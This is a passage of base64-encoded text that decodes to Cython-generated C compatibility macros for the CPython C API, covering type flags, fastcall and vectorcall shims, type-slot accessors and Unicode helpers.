5lIFB5X1RQRkxBR1NfSEFWRV9ORVdCVUZGRVIgMFxuI2VuZGlmXG4jaWZuZGVmIFB5X1RQRkxBR1NfSEFWRV9GSU5BTElaRVxuICAjZGVmaW5lIFB5X1RQRkxBR1NfSEFWRV9GSU5BTElaRSAwXG4jZW5kaWZcbiNpZm5kZWYgUHlfVFBGTEFHU19TRVFVRU5DRVxuICAjZGVmaW5lIFB5X1RQRkxBR1NfU0VRVUVOQ0UgMFxuI2VuZGlmXG4jaWZuZGVmIFB5X1RQRkxBR1NfTUFQUElOR1xuICAjZGVmaW5lIFB5X1RQRkxBR1NfTUFQUElORyAwXG4jZW5kaWZcbiNpZm5kZWYgUHlfVFBGTEFHU19JTU1VVEFCTEVUWVBFXG4gICNkZWZpbmUgUHlfVFBGTEFHU19JTU1VVEFCTEVUWVBFICgxVUwgPDwgOClcbiNlbmRpZlxuI2lmbmRlZiBQeV9UUEZMQUdTX0RJU0FMTE9XX0lOU1RBTlRJQVRJT05cbiAgI2RlZmluZSBQeV9UUEZMQUdTX0RJU0FMTE9XX0lOU1RBTlRJQVRJT04gKDFVTCA8PCA3KVxuI2VuZGlmXG4jaWZuZGVmIE1FVEhfU1RBQ0tMRVNTXG4gICNkZWZpbmUgTUVUSF9TVEFDS0xFU1MgMFxuI2VuZGlmXG4jaWZuZGVmIE1FVEhfRkFTVENBTExcbiAgI2lmbmRlZiBNRVRIX0ZBU1RDQUxMXG4gICAgICNkZWZpbmUgTUVUSF9GQVNUQ0FMTCAweDgwXG4gICNlbmRpZlxuICB0eXBlZGVmIFB5T2JqZWN0ICooKl9fUHl4X1B5Q0Z1bmN0aW9uRmFzdCkgKFB5T2JqZWN0ICpzZWxmLCBQeU9iamVjdCAqY29uc3QgKmFyZ3MsIFB5X3NzaXplX3QgbmFyZ3MpO1xuICB0eXBlZGVmIFB5T2JqZWN0ICooKl9fUHl4X1B5Q0Z1bmN0aW9uRmFzdFdpdGhLZXl3b3JkcykgKFB5T2JqZWN0ICpzZWxmLCBQeU9iamVjdCAqY29uc3QgKmFyZ3MsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlfc3NpemVfdCBuYXJncywgUHlPYmplY3QgKmt3bmFtZXMpO1xuI2Vsc2VcbiAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwQTRcbiAgIyAgZGVmaW5lIF9fUHl4X1B5Q0Z1bmN0aW9uRmFzdCBQeUNGdW5jdGlvbkZhc3RcbiAgIyAgZGVmaW5lIF9fUHl4X1B5Q0Z1bmN0aW9uRmFzdFdpdGhLZXl3b3JkcyBQeUNGdW5jdGlvbkZhc3RXaXRoS2V5d29yZHNcbiAgI2Vsc2VcbiAgIyAgZGVmaW5lIF9fUHl4X1B5Q0Z1bmN0aW9uRmFzdCBfUHlDRnVuY3Rpb25GYXN0XG4gICMgIGRlZmluZSBfX1B5eF9QeUNGdW5jdGlvbkZhc3RXaXRoS2V5d29yZHMgX1B5Q0Z1bmN0aW9uRmFzdFdpdGhLZXl3b3Jkc1xuICAjZW5kaWZcbiNlbmRpZlxuI2lmIENZVEhPTl9NRVRIX0ZBU1RDQUxMXG4gICNkZWZpbmUgX19QeXhfTUVUSF9GQVNUQ0FMTCBNRVRIX0ZBU1RDQUxMXG4gICNkZWZpbmUgX19QeXhfUHlDRnVuY3Rpb25fRmFzdENhbGwgX19QeXhfUHlDRnVuY3Rpb25GYXN0XG4gICNkZWZpbmUgX19QeXhfUHlDRnVuY3Rpb25fRmFzdENhbGxXaXRoS2V5d29yZHMgX19QeXhfUHlDRnVuY3Rpb25GYXN0V2l0aEtleXdvcmRzXG4jZWxzZVxuICAjZGVmaW5lIF9fUHl4X01FVEhfRkFTVENBTEwgTUVUSF9WQVJBUkdTXG4gICNkZWZpbmUgX19QeXhfUHlDRnVuY3Rpb25fRmFzdENhbGwgUHlDRnVuY3Rpb25cbiAgI2RlZmluZSBfX1B5eF9QeUNGdW5jdGlvbl9GYXN0Q2FsbFdpdGhLZXl3b3JkcyBQeUNGdW5jdGlvbldpdGhLZXl3b3Jkc1xuI2VuZGlmXG4jaWYgQ1lUSE9OX1ZFQ1RPUkNBTExcbiAgI2RlZmluZSBfX3B5eF92ZWN0b3JjYWxsZnVuYyB2ZWN0b3JjYWxsZnVuY1xuICAjZGVmaW5lIF9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCAgUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUXG4gICNkZWZpbmUgX19QeXhfUHlWZWN0b3JjYWxsX05BUkdTKG4pICBQeVZlY3RvcmNhbGxfTkFSR1MoKHNpemVfdCkobikpXG4jZWxzZVxuICAjZGVmaW5lIF9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCAgMFxuICAjZGVmaW5lIF9fUHl4X1B5VmVjdG9yY2FsbF9OQVJHUyhuKSAgKChQeV9zc2l6ZV90KShuKSlcbiNlbmRpZlxuI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwOTAwQjFcbiNkZWZpbmUgX19QeXhfUHlDRnVuY3Rpb25fQ2hlY2tFeGFjdChmdW5jKSAgUHlDRnVuY3Rpb25fQ2hlY2tFeGFjdChmdW5jKVxuI2Vsc2VcbiNkZWZpbmUgX19QeXhfUHlDRnVuY3Rpb25fQ2hlY2tFeGFjdChmdW5jKSAgUHlDRnVuY3Rpb25fQ2hlY2soZnVuYylcbiNlbmRpZlxuI2RlZmluZSBfX1B5eF9DeU9yUHlDRnVuY3Rpb25fQ2hlY2soZnVuYykgIFB5Q0Z1bmN0aW9uX0NoZWNrKGZ1bmMpXG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OXG4jZGVmaW5lIF9fUHl4X0N5T3JQeUNGdW5jdGlvbl9HRVRfRlVOQ1RJT04oZnVuYykgICgoKFB5Q0Z1bmN0aW9uT2JqZWN0KikoZnVuYykpLT5tX21sLT5tbF9tZXRoKVxuI2VsaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiNkZWZpbmUgX19QeXhfQ3lPclB5Q0Z1bmN0aW9uX0dFVF9GVU5DVElPTihmdW5jKSAgUHlDRnVuY3Rpb25fR0VUX0ZVTkNUSU9OKGZ1bmMpXG4jZW5kaWZcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05cbiNkZWZpbmUgX19QeXhfQ3lPclB5Q0Z1bmN0aW9uX0dFVF9GTEFHUyhmdW5jKSAgKCgoUHlDRnVuY3Rpb25PYmplY3QqKShmdW5jKSktPm1fbWwtPm1sX2ZsYWdzKVxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X0N5T3JQeUNGdW5jdGlvbl9HRVRfU0VMRihQeU9iamVjdCAqZnVuYykge1xuICAgIHJldHVybiAoX19QeXhfQ3lPclB5Q0Z1bmN0aW9uX0dFVF9GTEFHUyhmdW5jKSAmIE1FVEhfU1RBVElDKSA/IE5VTEwgOiAoKFB5Q0Z1bmN0aW9uT2JqZWN0KilmdW5jKS0+bV9zZWxmO1xufVxuI2VuZGlmXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfX0lzU2FtZUNGdW5jdGlvbihQeU9iamVjdCAqZnVuYywgdm9pZCAoKmNmdW5jKSh2b2lkKSkge1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICByZXR1cm4gUHlDRnVuY3Rpb25fQ2hlY2soZnVuYykgJiYgUHlDRnVuY3Rpb25fR2V0RnVuY3Rpb24oZnVuYykgPT0gKFB5Q0Z1bmN0aW9uKSBjZnVuYztcbiNlbHNlXG4gICAgcmV0dXJuIFB5Q0Z1bmN0aW9uX0NoZWNrKGZ1bmMpICYmIFB5Q0Z1bmN0aW9uX0dFVF9GVU5DVElPTihmdW5jKSA9PSAoUHlDRnVuY3Rpb24pIGNmdW5jO1xuI2VuZGlmXG59XG4jZGVmaW5lIF9fUHl4X0lzU2FtZUNGdW5jdGlvbihmdW5jLCBjZnVuYykgICBfX1B5eF9fSXNTYW1lQ0Z1bmN0aW9uKGZ1bmMsIGNmdW5jKVxuI2lmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzA5MDAwMCB8fCAoQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAmJiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYIDwgMHgwMzBBMDAwMClcbiAgI2RlZmluZSBfX1B5eF9QeVR5cGVfRnJvbU1vZHVsZUFuZFNwZWMobSwgcywgYikgICgodm9pZCltLCBQeVR5cGVfRnJvbVNwZWNXaXRoQmFzZXMocywgYikpXG4gIHR5cGVkZWYgUHlPYmplY3QgKigqX19QeXhfUHlDTWV0aG9kKShQeU9iamVjdCAqLCBQeVR5cGVPYmplY3QgKiwgUHlPYmplY3QgKmNvbnN0ICosIHNpemVfdCwgUHlPYmplY3QgKik7XG4jZWxzZVxuICAjZGVmaW5lIF9fUHl4X1B5VHlwZV9Gcm9tTW9kdWxlQW5kU3BlYyhtLCBzLCBiKSAgUHlUeXBlX0Zyb21Nb2R1bGVBbmRTcGVjKG0sIHMsIGIpXG4gICNkZWZpbmUgX19QeXhfUHlDTWV0aG9kICBQeUNNZXRob2RcbiNlbmRpZlxuI2lmbmRlZiBNRVRIX01FVEhPRFxuICAjZGVmaW5lIE1FVEhfTUVUSE9EIDB4MjAwXG4jZW5kaWZcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkgJiYgIWRlZmluZWQoUHlPYmplY3RfTWFsbG9jKVxuICAjZGVmaW5lIFB5T2JqZWN0X01hbGxvYyhzKSAgIFB5TWVtX01hbGxvYyhzKVxuICAjZGVmaW5lIFB5T2JqZWN0X0ZyZWUocCkgICAgIFB5TWVtX0ZyZWUocClcbiAgI2RlZmluZSBQeU9iamVjdF9SZWFsbG9jKHApICBQeU1lbV9SZWFsbG9jKHApXG4jZW5kaWZcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICNkZWZpbmUgX19QeXhfUHlGcmFtZV9TZXRMaW5lTnVtYmVyKGZyYW1lLCBsaW5lbm8pXG4jZWxpZiBDWVRIT05fQ09NUElMSU5HX0lOX0dSQUFMICYmIGRlZmluZWQoR1JBQUxQWV9WRVJTSU9OX05VTSkgJiYgR1JBQUxQWV9WRVJTSU9OX05VTSA+IDB4MTkwMDAwMDBcbiAgI2RlZmluZSBfX1B5eF9QeUNvZGVfSGFzRnJlZVZhcnMoY28pICAoUHlDb2RlX0dldE51bUZyZWUoY28pID4gMClcbiAgI2RlZmluZSBfX1B5eF9QeUZyYW1lX1NldExpbmVOdW1iZXIoZnJhbWUsIGxpbmVubykgR3JhYWxQeUZyYW1lX1NldExpbmVOdW1iZXIoKGZyYW1lKSwgKGxpbmVubykpXG4jZWxpZiBDWVRIT05fQ09NUElMSU5HX0lOX0dSQUFMXG4gICNkZWZpbmUgX19QeXhfUHlDb2RlX0hhc0ZyZWVWYXJzKGNvKSAgKFB5Q29kZV9HZXROdW1GcmVlKGNvKSA+IDApXG4gICNkZWZpbmUgX19QeXhfUHlGcmFtZV9TZXRMaW5lTnVtYmVyKGZyYW1lLCBsaW5lbm8pIF9QeUZyYW1lX1NldExpbmVOdW1iZXIoKGZyYW1lKSwgKGxpbmVubykpXG4jZWxzZVxuICAjZGVmaW5lIF9fUHl4X1B5Q29kZV9IYXNGcmVlVmFycyhjbykgIChQeUNvZGVfR2V0TnVtRnJlZShjbykgPiAwKVxuICAjZGVmaW5lIF9fUHl4X1B5RnJhbWVfU2V0TGluZU51bWJlcihmcmFtZSwgbGluZW5vKSAgKGZyYW1lKS0+Zl9saW5lbm8gPSAobGluZW5vKVxuI2VuZGlmXG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAjZGVmaW5lIF9fUHl4X1B5VGhyZWFkU3RhdGVfQ3VycmVudCBQeVRocmVhZFN0YXRlX0dldCgpXG4jZWxpZiAhQ1lUSE9OX0ZBU1RfVEhSRUFEX1NUQVRFXG4gICNkZWZpbmUgX19QeXhfUHlUaHJlYWRTdGF0ZV9DdXJyZW50IFB5VGhyZWFkU3RhdGVfR0VUKClcbiNlbGlmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwQTFcbiAgI2RlZmluZSBfX1B5eF9QeVRocmVhZFN0YXRlX0N1cnJlbnQgUHlUaHJlYWRTdGF0ZV9HZXRVbmNoZWNrZWQoKVxuI2Vsc2VcbiAgI2RlZmluZSBfX1B5eF9QeVRocmVhZFN0YXRlX0N1cnJlbnQgX1B5VGhyZWFkU3RhdGVfVW5jaGVja2VkR2V0KClcbiNlbmRpZlxuI2lmIENZVEhPTl9VU0VfTU9EVUxFX1NUQVRFXG5zdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkICpfX1B5eF9fUHlNb2R1bGVfR2V0U3RhdGUoUHlPYmplY3QgKm9wKVxue1xuICAgIHZvaWQgKnJlc3VsdDtcbiAgICByZXN1bHQgPSBQeU1vZHVsZV9HZXRTdGF0ZShvcCk7XG4gICAgaWYgKCFyZXN1bHQpXG4gICAgICAgIFB5X0ZhdGFsRXJyb3IoIkNvdWxkblwndCBmaW5kIHRoZSBtb2R1bGUgc3RhdGUiKTtcbiAgICByZXR1cm4gcmVzdWx0O1xufVxuI2RlZmluZSBfX1B5eF9QeU1vZHVsZV9HZXRTdGF0ZShvKSAoX19weXhfbXN0YXRldHlwZSAqKV9fUHl4X19QeU1vZHVsZV9HZXRTdGF0ZShvKVxuI2Vsc2VcbiNkZWZpbmUgX19QeXhfUHlNb2R1bGVfR2V0U3RhdGUob3ApICgodm9pZClvcCxfX3B5eF9tc3RhdGVfZ2xvYmFsKVxuI2VuZGlmXG4jZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0dldFNsb3Qob2JqLCBuYW1lLCBmdW5jX2N0eXBlKSAgX19QeXhfUHlUeXBlX0dldFNsb3QoUHlfVFlQRSgoUHlPYmplY3QgKikgb2JqKSwgbmFtZSwgZnVuY19jdHlwZSlcbiNkZWZpbmUgX19QeXhfUHlPYmplY3RfVHJ5R2V0U2xvdChvYmosIG5hbWUsIGZ1bmNfY3R5cGUpIF9fUHl4X1B5VHlwZV9UcnlHZXRTbG90KFB5X1RZUEUob2JqKSwgbmFtZSwgZnVuY19jdHlwZSlcbiNkZWZpbmUgX19QeXhfUHlPYmplY3RfR2V0U3ViU2xvdChvYmosIHN1YiwgbmFtZSwgZnVuY19jdHlwZSkgX19QeXhfUHlUeXBlX0dldFN1YlNsb3QoUHlfVFlQRShvYmopLCBzdWIsIG5hbWUsIGZ1bmNfY3R5cGUpXG4jZGVmaW5lIF9fUHl4X1B5T2JqZWN0X1RyeUdldFN1YlNsb3Qob2JqLCBzdWIsIG5hbWUsIGZ1bmNfY3R5cGUpIF9fUHl4X1B5VHlwZV9UcnlHZXRTdWJTbG90KFB5X1RZUEUob2JqKSwgc3ViLCBuYW1lLCBmdW5jX2N0eXBlKVxuI2lmIENZVEhPTl9VU0VfVFlQRV9TTE9UU1xuICAjZGVmaW5lIF9fUHl4X1B5VHlwZV9HZXRTbG90KHR5cGUsIG5hbWUsIGZ1bmNfY3R5cGUpICAoKHR5cGUpLT5uYW1lKVxuICAjZGVmaW5lIF9fUHl4X1B5VHlwZV9UcnlHZXRTbG90KHR5cGUsIG5hbWUsIGZ1bmNfY3R5cGUpIF9fUHl4X1B5VHlwZV9HZXRTbG90KHR5cGUsIG5hbWUsIGZ1bmNfY3R5cGUpXG4gICNkZWZpbmUgX19QeXhfUHlUeXBlX0dldFN1YlNsb3QodHlwZSwgc3ViLCBuYW1lLCBmdW5jX2N0eXBlKSAoKCh0eXBlKS0+c3ViKSA/ICgodHlwZSktPnN1Yi0+bmFtZSkgOiBOVUxMKVxuICAjZGVmaW5lIF9fUHl4X1B5VHlwZV9UcnlHZXRTdWJTbG90KHR5cGUsIHN1YiwgbmFtZSwgZnVuY19jdHlwZSkgX19QeXhfUHlUeXBlX0dldFN1YlNsb3QodHlwZSwgc3ViLCBuYW1lLCBmdW5jX2N0eXBlKVxuI2Vsc2VcbiAgI2RlZmluZSBfX1B5eF9QeVR5cGVfR2V0U2xvdCh0eXBlLCBuYW1lLCBmdW5jX2N0eXBlKSAgKChmdW5jX2N0eXBlKSBQeVR5cGVfR2V0U2xvdCgodHlwZSksIFB5XyMjbmFtZSkpXG4gICNkZWZpbmUgX19QeXhfUHlUeXBlX1RyeUdldFNsb3QodHlwZSwgbmFtZSwgZnVuY19jdHlwZSlcXFxuICAgICgoX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA+PSAweDAzMEEwMDAwIHx8XFxcbiAgICAgKFB5VHlwZV9HZXRGbGFncyh0eXBlKSAmIFB5X1RQRkxBR1NfSEVBUFRZUEUpIHx8IF9fUHl4X2dldF9ydW50aW1lX3ZlcnNpb24oKSA+PSAweDAzMEEwMDAwKSA/XFxcbiAgICAgX19QeXhfUHlUeXBlX0dldFNsb3QodHlwZSwgbmFtZSwgZnVuY19jdHlwZSkgOiBOVUxMKVxuICAjZGVmaW5lIF9fUHl4X1B5VHlwZV9HZXRTdWJTbG90KG9iaiwgc3ViLCBuYW1lLCBmdW5jX2N0eXBlKSBfX1B5eF9QeVR5cGVfR2V0U2xvdChvYmosIG5hbWUsIGZ1bmNfY3R5cGUpXG4gICNkZWZpbmUgX19QeXhfUHlUeXBlX1RyeUdldFN1YlNsb3Qob2JqLCBzdWIsIG5hbWUsIGZ1bmNfY3R5cGUpIF9fUHl4X1B5VHlwZV9UcnlHZXRTbG90KG9iaiwgbmFtZSwgZnVuY19jdHlwZSlcbiNlbmRpZlxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiB8fCBkZWZpbmVkKF9QeURpY3RfTmV3UHJlc2l6ZWQpXG4jZGVmaW5lIF9fUHl4X1B5RGljdF9OZXdQcmVzaXplZChuKSAgKChuIDw9IDgpID8gUHlEaWN0X05ldygpIDogX1B5RGljdF9OZXdQcmVzaXplZChuKSlcbiNlbHNlXG4jZGVmaW5lIF9fUHl4X1B5RGljdF9OZXdQcmVzaXplZChuKSAgUHlEaWN0X05ldygpXG4jZW5kaWZcbiNkZWZpbmUgX19QeXhfUHlOdW1iZXJfRGl2aWRlKHgseSkgICAgICAgICBQeU51bWJlcl9UcnVlRGl2aWRlKHgseSlcbiNkZWZpbmUgX19QeXhfUHlOdW1iZXJfSW5QbGFjZURpdmlkZSh4LHkpICBQeU51bWJlcl9JblBsYWNlVHJ1ZURpdmlkZSh4LHkpXG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OICYmIENZVEhPTl9VU0VfVU5JQ09ERV9JTlRFUk5BTFNcbiNkZWZpbmUgX19QeXhfUHlEaWN0X0dldEl0ZW1TdHJXaXRoRXJyb3IoZGljdCwgbmFtZSkgIF9QeURpY3RfR2V0SXRlbV9Lbm93bkhhc2goZGljdCwgbmFtZSwgKChQeUFTQ0lJT2JqZWN0ICopIG5hbWUpLT5oYXNoKVxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKiBfX1B5eF9QeURpY3RfR2V0SXRlbVN0cihQeU9iamVjdCAqZGljdCwgUHlPYmplY3QgKm5hbWUpIHtcbiAgICBQeU9iamVjdCAqcmVzID0gX19QeXhfUHlEaWN0X0dldEl0ZW1TdHJXaXRoRXJyb3IoZGljdCwgbmFtZSk7XG4gICAgaWYgKHJlcyA9PSBOVUxMKSBQeUVycl9DbGVhcigpO1xuICAgIHJldHVybiByZXM7XG59XG4jZWxpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZIHx8IFBZUFlfVkVSU0lPTl9OVU0gPj0gMHgwNzAyMDAwMFxuI2RlZmluZSBfX1B5eF9QeURpY3RfR2V0SXRlbVN0cldpdGhFcnJvciAgUHlEaWN0X0dldEl0ZW1XaXRoRXJyb3JcbiNkZWZpbmUgX19QeXhfUHlEaWN0X0dldEl0ZW1TdHIgICAgICAgICAgIFB5RGljdF9HZXRJdGVtXG4jZWxzZVxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKiBfX1B5eF9QeURpY3RfR2V0SXRlbVN0cldpdGhFcnJvcihQeU9iamVjdCAqZGljdCwgUHlPYmplY3QgKm5hbWUpIHtcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX1BZUFlcbiAgICByZXR1cm4gUHlEaWN0X0dldEl0ZW0oZGljdCwgbmFtZSk7XG4jZWxzZVxuICAgIFB5RGljdEVudHJ5ICplcDtcbiAgICBQeURpY3RPYmplY3QgKm1wID0gKFB5RGljdE9iamVjdCopIGRpY3Q7XG4gICAgbG9uZyBoYXNoID0gKChQeVN0cmluZ09iamVjdCAqKSBuYW1lKS0+b2Jfc2hhc2g7XG4gICAgYXNzZXJ0KGhhc2ggIT0gLTEpO1xuICAgIGVwID0gKG1wLT5tYV9sb29rdXApKG1wLCBuYW1lLCBoYXNoKTtcbiAgICBpZiAoZXAgPT0gTlVMTCkge1xuICAgICAgICByZXR1cm4gTlVMTDtcbiAgICB9XG4gICAgcmV0dXJuIGVwLT5tZV92YWx1ZTtcbiNlbmRpZlxufVxuI2RlZmluZSBfX1B5eF9QeURpY3RfR2V0SXRlbVN0ciAgICAgICAgICAgUHlEaWN0X0dldEl0ZW1cbiNlbmRpZlxuI2lmIENZVEhPTl9VU0VfVFlQRV9TTE9UU1xuICAjZGVmaW5lIF9fUHl4X1B5VHlwZV9HZXRGbGFncyh0cCkgICAoKChQeVR5cGVPYmplY3QgKil0cCktPnRwX2ZsYWdzKVxuICAjZGVmaW5lIF9fUHl4X1B5VHlwZV9IYXNGZWF0dXJlKHR5cGUsIGZlYXR1cmUpICAoKF9fUHl4X1B5VHlwZV9HZXRGbGFncyh0eXBlKSAmIChmZWF0dXJlKSkgIT0gMClcbiNlbHNlXG4gICNkZWZpbmUgX19QeXhfUHlUeXBlX0dldEZsYWdzKHRwKSAgIChQeVR5cGVfR2V0RmxhZ3MoKFB5VHlwZU9iamVjdCAqKXRwKSlcbiAgI2RlZmluZSBfX1B5eF9QeVR5cGVfSGFzRmVhdHVyZSh0eXBlLCBmZWF0dXJlKSAgUHlUeXBlX0hhc0ZlYXR1cmUodHlwZSwgZmVhdHVyZSlcbiNlbmRpZlxuI2RlZmluZSBfX1B5eF9QeU9iamVjdF9HZXRJdGVyTmV4dEZ1bmMoaXRlcmF0b3IpICBfX1B5eF9QeU9iamVjdF9HZXRTbG90KGl0ZXJhdG9yLCB0cF9pdGVybmV4dCwgaXRlcm5leHRmdW5jKVxuI2lmIENZVEhPTl9VU0VfVFlQRV9TUEVDU1xuI2RlZmluZSBfX1B5eF9QeUhlYXBUeXBlT2JqZWN0X0dDX0RlbChvYmopICB7XFxcbiAgICBQeVR5cGVPYmplY3QgKnR5cGUgPSBQeV9UWVBFKChQeU9iamVjdCopb2JqKTtcXFxuICAgIGFzc2VydChfX1B5eF9QeVR5cGVfSGFzRmVhdHVyZSh0eXBlLCBQeV9UUEZMQUdTX0hFQVBUWVBFKSk7XFxcbiAgICBQeU9iamVjdF9HQ19EZWwob2JqKTtcXFxuICAgIFB5X0RFQ1JFRih0eXBlKTtcXFxufVxuI2Vsc2VcbiNkZWZpbmUgX19QeXhfUHlIZWFwVHlwZU9iamVjdF9HQ19EZWwob2JqKSAgUHlPYmplY3RfR0NfRGVsKG9iailcbiNlbmRpZlxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfUkVBRFkob3ApICAgICAgICgwKVxuICAjZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9SRUFEX0NIQVIodSwgaSkgUHlVbmljb2RlX1JlYWRDaGFyKHUsIGkpXG4gICNkZWZpbmUgX19QeXhfUHlVbmljb2RlX01BWF9DSEFSX1ZBTFVFKHUpICAgKCh2b2lkKXUsIDExMTQxMTFVKVxuICAjZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9LSU5EKHUpICAgICAgICAgKCh2b2lkKXUsICgwKSlcbiAgI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfREFUQSh1KSAgICAgICAgICgodm9pZCopdSlcbiAgI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfUkVBRChrLCBkLCBpKSAgICgodm9pZClrLCBQeVVuaWNvZGVfUmVhZENoYXIoKFB5T2JqZWN0KikoZCksIGkpKVxuICAjZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9JU19UUlVFKHUpICAgICAgKDAgIT0gUHlVbmljb2RlX0dldExlbmd0aCh1KSlcbiNlbHNlXG4gICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEMwMDAwXG4gICAgI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfUkVBRFkob3ApICAgICAgICgwKVxuICAjZWxzZVxuICAgICNkZWZpbmUgX19QeXhfUHlVbmljb2RlX1JFQURZKG9wKSAgICAgICAobGlrZWx5KFB5VW5pY29kZV9JU19SRUFEWShvcCkpID9cXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMCA6IF9QeVVuaWNvZGVfUmVhZHkoKFB5T2JqZWN0ICopKG9wKSkpXG4gICNlbmRpZlxuICAjZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9SRUFEX0NIQVIodSwgaSkgUHlVbmljb2RlX1JFQURfQ0hBUih1LCBpKVxuICAjZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9NQVhfQ0hBUl9WQUxVRSh1KSAgIFB5VW5pY29kZV9NQVhfQ0hBUl9WQUxVRSh1KVxuICAjZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9LSU5EKHUpICAgICAgICAgKChpbnQpUHlVbmljb2RlX0tJTkQodSkpXG4gICNkZWZpbmUgX19QeXhfUHlVbmljb2RlX0RBVEEodSkgICAgICAgICBQeVVuaWNvZGVfREFUQSh1KVxuICAjZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9SRUFEKGssIGQsIGkpICAgUHlVbmljb2RlX1JFQUQoaywgZCwgaSlcbiAgI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfV1JJVEUoaywgZCwgaSwgY2gpICBQeVVuaWNvZGVfV1JJVEUoaywgZCwgaSwgKFB5X1VDUzQpIGNoKVxuICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBDMDAwMFxuICAgICNkZWZpbmUgX19QeXhfUHlVbmljb2RlX0lTX1RSVUUodSkgICAgICAoMCAhPSBQeVVuaWNvZGVfR0VUX0xFTkdUSCh1KSlcbiAgI2Vsc2VcbiAgICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OICYmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwOTAwMDBcbiAgICAjZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9JU19UUlVFKHUpICAgICAgKDAgIT0gKGxpa2VseShQeVVuaWNvZGVfSVNfUkVBRFkodSkpID8gUHlVbmljb2RlX0dFVF9MRU5HVEgodSkgOiAoKFB5Q29tcGFjdFVuaWNvZGVPYmplY3QgKikodSkpLT53c3RyX2xlbmd0aCkpXG4gICAgI2Vsc2VcbiAgICAjZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9JU19UUlVFKHUpICAgICAgKDAgIT0gKGxpa2VseShQeVVuaWNvZGVfSVNfUkVBRFkodSkpID8gUHlVbmljb2RlX0dFVF9MRU5HVEgodSkgOiBQeVVuaWNvZGVfR0VUX1NJWkUodSkpKVxuICAgICNlbmRpZlxuICAjZW5kaWZcbiNlbmRpZlxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fUFlQWVxuICAjZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9Db25jYXQoYSwgYikgICAgICBQeU51bWJlcl9BZGQoYSwgYilcbiAgI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfQ29uY2F0U2FmZShhLCBiKSAgUHlOdW1iZXJfQWRkKGEsIGIpXG4jZWxzZVxuICAjZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9Db25jYXQoYSwgYikgICAgICBQeVVuaWNvZGVfQ29uY2F0KGEsIGIpXG4gICNkZWZpbmUgX19QeXhfUHlVbmljb2RlX0NvbmNhdFNhZmUoYSwgYikgICgodW5saWtlbHkoKGEpID09IFB5X05vbmUpIHx8IHVubGlrZWx5KChiKSA9PSBQeV9Ob25lKSkgP1xcXG4gICAgICBQeU51bWJlcl9BZGQoYSwgYikgOiBfX1B5eF9QeVVuaWNvZGVfQ29uY2F0KGEsIGIpKVxuI2VuZGlmXG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZXG4gICNpZiAhZGVmaW5lZChQeVVuaWNvZGVfRGVjb2RlVW5pY29kZUVzY2FwZSlcbiAgICAjZGVmaW5lIFB5VW5pY29kZV9EZWNvZGVVbmljb2RlRXNjYXBlKHMsIHNpemUsIGVycm9ycykgIFB5VW5pY29kZV9EZWNvZGUocywgc2l6ZSwgInVuaWNvZGVfZXNjYXBlIiwgZXJyb3JzKVxuICAjZW5kaWZcbiAgI2lmICFkZWZpbmVkKFB5VW5pY29kZV9Db250YWlucylcbiAgICAjZGVmaW5lIFB5VW5pY29kZV9Db250YWlucyh1LCBzKSAgUHlTZXF1ZW5jZV9Db250YWlucyh1LCBzKVxuI